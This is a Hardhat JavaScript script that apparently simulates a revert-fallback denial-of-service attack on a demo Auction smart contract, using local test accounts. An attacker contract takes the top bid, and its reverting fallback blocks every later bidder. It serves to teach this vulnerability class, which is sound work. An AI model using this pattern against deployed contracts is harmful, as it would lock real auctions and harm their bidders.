//
// @dev Simulate an unexpect exception
// @description Attacker call attackBid() func to bid success. Since attack contract
// include a revert fallback, next bidder bid with a higher price will revert the tx.
// (transfer token to attack contract will trigger the revert fallback func, contract
// auction's bid() func transfer 'topBid' amount of token to it when next bidder comes.)
//
// @reference https://cloud.tencent.com/developer/article/1606984?from=article.detail.1595551
//

const { ethers } = require('hardhat');

async function main() {
    const [ owner, bidder1, bidder2, attacker ] = await ethers.getSigners();
    const Auction = await ethers.getContractFactory('Auction', owner);
    const auction = await Auction.deploy({value: ethers.utils.parseEther('1.0')});
    await auction.deployed();

    const Attack = await ethers.getContractFactory('RevertAuction', attacker);
    const attack = await Attack.deploy();
    await attack.deployed();

    // character
    console.log(`owner: ${owner.address}`);
    console.log(`bidder1: ${bidder1.address}`);
    console.log(`bidder2: ${bidder2.address}`);
    console.log(`attacker: ${attacker.address}`);
    console.log(`contract Auction: ${auction.address}`);
    console.log(`contract RevertAuction: ${attack.address}\n`);

    console.log(`==== Owner initial bid is 1 ETH ====`);
    console.log(`topBidder is ${await auction.topBidder()}`);
    console.log(`topBid is ${await auction.topBid()} wei`);
    console.log(`contract Auction owned ETH is: ${ethers.utils.formatEther(await auction.getBalance())} ETH\n`);

    // bidder1 call bid
    console.log(`==== Bidder1 bid 5 ETH ====`);
    await auction.connect(bidder1).bid({value: ethers.utils.parseEther('5.0')});
    console.log(`topBidder is ${await auction.topBidder()}`);
    console.log(`topBid is ${await auction.topBid()} wei`);
    console.log(`contract Auction owned ETH is: ${ethers.utils.formatEther(await auction.getBalance())} ETH\n`);

    // attacker call bid
    console.log(`==== Attacker bid 10 ETH ====`);
    await attack.connect(attacker).attackBid(auction.address,{value: ethers.utils.parseEther('10.0')});
    console.log(`topBidder is ${await auction.topBidder()}`);
    console.log(`topBid is ${await auction.topBid()} wei`);
    console.log(`contract Auction owned ETH is: ${ethers.utils.formatEther(await auction.getBalance())} ETH\n`);

    // bidder2 try to bid with 15 ETH
    // should fail because topBidder is contract Attack and revert() is included
    // in fallback func
    console.log(`==== Bidder2 bid 15 ETH ====`);
    await auction.connect(bidder2).bid({value: ethers.utils.parseEther('15.0')});
    console.log(`topBidder is ${await auction.topBidder()}`);
    console.log(`topBid is ${await auction.topBid()} wei`);
    console.log(`contract Auction owned ETH is: ${ethers.utils.formatEther(await auction.getBalance())} ETH\n`);
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });